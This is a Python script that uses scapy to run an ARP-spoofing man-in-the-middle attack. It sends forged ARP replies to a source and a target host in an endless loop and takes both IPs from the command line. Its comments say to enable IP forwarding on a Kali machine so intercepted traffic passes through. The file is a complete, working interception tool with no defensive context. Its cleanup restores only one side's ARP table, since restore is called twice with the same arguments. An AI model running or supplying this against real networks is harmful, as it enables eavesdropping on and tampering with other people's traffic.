import scapy.all as scapy
import time
import subprocess
import optparse
# Use Python3 :- The use of inline print statements. Modify just one line to make it work for python2


def get_mac(ip):
    # Given an IP, discover its corresponding MAC address using scapy.
    arp_request = scapy.ARP(pdst=ip)
    # Sending an ARP request. ARP => Address resolution protocol
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Destination mac is the broadcast.
    arp_request_broadcast = broadcast/arp_request
    # Combined packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # verbose is False to not print unnecessary messages.
    clients_list = []
    for element in answered_list:
        if element[1].psrc == ip:
            # returning the MAC address of the desired IP
            return element[1].hwsrc
    return 0
    # No such device found with given IP


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    # Just like op=1 was "Who has", op=2 tells the device that this mac is connected with this ip.
    scapy.send(packet, verbose=False, count=4)
    # count = 4 only to ensure that the packet is sent and not lost midway.


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # To know all the fields that can be set, type "scapy.ls(scapy.ARP) in  the terminal
    scapy.send(packet, verbose=False)


def run_arp_spoof(source_ip, target_ip):
    sent_packet_count = 0
    try:
        while True:
            # Continue to send packets until CTRL + C is encountered.
            spoof(source_ip, target_ip)
            spoof(target_ip, source_ip)
            # Both the devices need to be fooled
            sent_packet_count = sent_packet_count + 2
            # +2 coz 2 packets were sent. One to source IP and other to target IP
            print("\r[+] Packets sent: " + str(sent_packet_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ...... Resetting ARP tables..... Please wait.")
        restore(source_ip, target_ip)
        restore(source_ip, target_ip)


def run():
    # subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    parser = optparse.OptionParser()
    parser.add_option("-s", "--source", dest="source", help="Source IP")
    parser.add_option("-t", "--target", dest="target", help="Target IP")
    (options, arguments) = parser.parse_args()
    if (not options.source) or (not options.target):
        print("[-] Insufficient arguments. Please try again!")
    else:
        run_arp_spoof(options.source, options.target)


run()

# Remember to execute the following command on the terminal
# to allow Kali Machine to forward packets without dropping them
# Command: echo 1 > /proc/sys/net/ipv4/ip_forward

# Execute the command.
# Changes made to dns.py
# Enclose IP addresses within strings
